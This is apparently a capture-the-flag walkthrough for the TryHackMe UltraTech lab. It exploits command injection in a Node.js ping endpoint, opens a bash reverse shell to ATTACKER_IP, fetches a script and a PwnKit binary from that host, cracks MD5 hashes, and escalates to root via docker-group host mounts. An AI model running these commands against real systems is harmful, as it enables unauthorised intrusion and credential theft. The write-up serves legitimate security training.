# UltraTech

The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing

Room: https://tryhackme.com/room/ultratech1

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/ultratech1.md

----------------------

## Summary

UltraTech exposed a Node.js REST API on port `8081` and an Apache web application on port `31331`.

The main attack path was:

```text
Service enumeration
Frontend JavaScript analysis
REST API command injection
Reverse shell as www
SQLite database extraction
Password hash cracking
SSH or su to r00t
Docker group privilege escalation
Read root's private SSH key
```

An additional PwnKit attempt was made from the initial `www` shell, but the installed PolicyKit package was patched.

---

## Nmap

Start with a full TCP scan:

```bash
sudo nmap -Pn -sC -sV -p- --min-rate 5000 -oN nmap-all.txt TARGET_IP
```

The important services were:

```text
22/tcp     SSH
8081/tcp   Node.js REST API
31331/tcp  Apache HTTP Server
```

The target appeared to be running Ubuntu.

---

## Web Application

Browsing to the Apache service on port `31331` revealed the UltraTech web application:

```text
http://TARGET_IP:31331/
```

The frontend communicated with the Node.js REST API on port `8081`.

The API could be enumerated with Gobuster:

```bash
gobuster dir \
  -u http://TARGET_IP:8081/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50
```

This revealed two routes:

```text
/auth
/ping
```

Testing `/auth` without parameters returned:

```text
You must specify a login
```

The `/ping` endpoint returned an Express error when no parameter was supplied:

```text
TypeError: Cannot read property 'replace' of undefined
```

The stack trace also disclosed the application location:

```text
/home/www/api/index.js
```

---

## Identifying the Ping Parameter

Common parameter names were tested:

```bash
for p in ip host target address; do
  echo "=== $p ==="
  curl -s "http://TARGET_IP:8081/ping?$p=127.0.0.1"
  echo
done
```

The `ip` parameter returned valid ping output:

```text
PING 127.0.0.1 ...
```

The vulnerable endpoint was therefore:

```text
/ping?ip=
```

---

## Command Injection

A semicolon payload did not work:

```bash
curl -sG \
  --data-urlencode 'ip=127.0.0.1;id' \
  http://TARGET_IP:8081/ping
```

The response indicated that the semicolon had been removed:

```text
ping: 127.0.0.1id: Name or service not known
```

Backtick command substitution was still accepted:

```bash
curl -sG \
  --data-urlencode 'ip=`id`' \
  http://TARGET_IP:8081/ping
```

The response included output from `id`, confirming command execution as the web user:

```text
uid=1002(www) gid=1002(www) groups=1002(www)
```

---

## Reverse Shell

Rather than extracting every file through the ping response, a reverse shell script was hosted from the AttackBox.

Create the script:

```bash
cat > /tmp/rs.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
```

Host it:

```bash
cd /tmp
python3 -m http.server 8000
```

Start a listener:

```bash
nc -lvnp 4444
```

Download the script through the command injection:

```bash
curl -sG \
  --data-urlencode 'ip=`curl http://ATTACKER_IP:8000/rs.sh -o /tmp/rs.sh`' \
  http://TARGET_IP:8081/ping
```

Execute it:

```bash
curl -sG \
  --data-urlencode 'ip=`bash /tmp/rs.sh`' \
  http://TARGET_IP:8081/ping
```

The listener received a shell as `www`:

```text
www@target:~/api$
```

---

## Database Discovery

The API directory contained a SQLite database:

```bash
ls -la
```

Files included:

```text
index.js
package.json
start.sh
node_modules/
utech.db.sqlite
```

The database filename was:

```text
utech.db.sqlite
```

The database could be queried with SQLite:

```bash
sqlite3 -header -column utech.db.sqlite 'SELECT * FROM users;'
```

Alternatively, because the file was small, its contents were visible with:

```bash
cat utech.db.sqlite
```

The database contained two users:

```text
r00t
admin
```

The password hashes were MD5-style 32-character hexadecimal values.

The first user's hash began with:

```text
f357a0c5...
```

Sensitive values should not be included in public notes in full.

---

## Password Cracking

The hashes were cracked using a password-cracking service or a local wordlist.

Example with Hashcat:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Or with John:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Recovered credentials included:

```text
r00t:<REDACTED_PASSWORD>
admin:<REDACTED_PASSWORD>
```

The `r00t` credentials were valid for the Linux account.

---

## SSH Access

SSH could be used directly:

```bash
ssh r00t@TARGET_IP
```

Alternatively, from the existing `www` reverse shell:

```bash
su - r00t
```

After authentication:

```bash
id
```

Output showed:

```text
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

The important mistake was membership in the `docker` group.

---

## Privilege Escalation Through Docker

After authenticating as `r00t`, I checked the user’s identity and group memberships:

```bash
id
groups
```

The output showed that `r00t` was a member of the `docker` group:

```text
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

```text
r00t docker
```

Membership in the `docker` group is effectively equivalent to root access. A user who can communicate with the Docker daemon can create a privileged container, mount arbitrary host directories, and access files that would normally only be readable by root.

I first checked which Docker images were already available:

```bash
docker images
```

The target contained an old `bash` image:

```text
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
bash         latest    495d6437fc1e   7 years ago   15.8MB
```

Using an existing image was useful because the target did not need to download anything from the internet.

I started a new container and mounted the host’s entire root filesystem at `/mnt` inside the container:

```bash
docker run --rm -it -v /:/mnt bash
```

The options used were:

```text
--rm       Remove the container automatically when it exits
-it        Allocate an interactive terminal
-v /:/mnt  Mount the host's / directory inside the container at /mnt
bash       Use the existing bash image
```

The prompt changed to:

```text
bash-5.0#
```

At this point I was root inside the container. More importantly, the host filesystem was mounted beneath `/mnt`, so files owned by host root could be accessed through paths such as:

```text
/mnt/root
/mnt/etc
/mnt/home
```

I confirmed the mounted filesystem belonged to the Ubuntu host:

```bash
cat /mnt/etc/os-release
```

```text
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
```

Running this without `/mnt` would show the container’s operating system instead:

```bash
cat /etc/os-release
```

```text
Alpine Linux v3.9
```

This distinction is important: the container was Alpine, but `/mnt` contained the Ubuntu host filesystem.

The final question only required reading root’s private SSH key, so it was not necessary to fully enter the host environment. The key could be accessed directly through the mounted filesystem:

```bash
ls -la /mnt/root/.ssh
head -c 9 /mnt/root/.ssh/id_rsa
echo
```

For a root shell operating within the host filesystem, I could instead use `chroot`:

```bash
chroot /mnt /bin/bash
```

I then confirmed the effective identity:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

After entering the chroot, normal host paths could be used directly:

```bash
cat /etc/os-release
ls -la /root/.ssh
head -c 9 /root/.ssh/id_rsa
echo
```

The privilege-escalation chain was therefore:

```text
r00t is a member of docker
        ↓
Docker daemon accepts commands from r00t
        ↓
Start a container as root
        ↓
Mount the host's / directory at /mnt
        ↓
Access host root-owned files
        ↓
Optionally chroot into the mounted host filesystem
        ↓
Host root access
```

The underlying mistake was adding an unprivileged account to the `docker` group. Access to the Docker daemon should be treated as administrative access because it can be used to bypass normal host filesystem permissions.


## Root Private SSH Key

The final question requested the first nine characters of the root user's private SSH key.

Read the key through the mounted host filesystem:

```bash
head -c 9 /mnt/root/.ssh/id_rsa
echo
```

The answer was taken from the first nine characters of the key data, excluding the PEM header.

Do not include the complete private key in public notes.

---

## PwnKit Attempt

An alternate privilege-escalation attempt was made from the initial `www` reverse shell using PwnKit.

The exploit binary was downloaded:

```bash
cd /tmp
wget http://ATTACKER_IP:8000/PwnKit
chmod +x PwnKit
./PwnKit
```

The exploit created temporary artefacts such as:

```text
GCONV_PATH=.
```

However, it did not return a root shell.

The target reported:

```bash
/usr/bin/pkexec --version
```

```text
pkexec version 0.105
```

The upstream version alone was misleading because Ubuntu backports security fixes.

The actual host package version was checked from the Docker-mounted filesystem:

```bash
chroot /mnt /bin/bash -c \
  "dpkg-query -W -f='\${Version}\n' policykit-1"
```

The installed version was:

```text
0.105-26ubuntu1.3
```

This package revision contains the PwnKit fix, explaining why the exploit failed.

The host operating system was confirmed with:

```bash
cat /mnt/etc/os-release
```

```text
Ubuntu 20.04.6 LTS
```

---

## Attack Chain

```text
Nmap enumeration
        ↓
Apache web application on 31331
        ↓
Node.js REST API on 8081
        ↓
Discover /auth and /ping
        ↓
Command injection through /ping?ip=
        ↓
Backtick command substitution
        ↓
Reverse shell as www
        ↓
Read utech.db.sqlite
        ↓
Crack r00t password hash
        ↓
SSH or su to r00t
        ↓
Discover docker group membership
        ↓
Mount host filesystem in container
        ↓
Read root private SSH key
```

---

## Answers

```text
Software on port 8081:
Node.js

Other non-standard port:
31331

Software using that port:
Apache

GNU/Linux distribution:
Ubuntu

REST API routes used by the web application:
2

Database filename:
utech.db.sqlite

First user's password hash:
[REDACTED]

Password associated with the hash:
[REDACTED]

First nine characters of root's private SSH key:
[REDACTED]
```
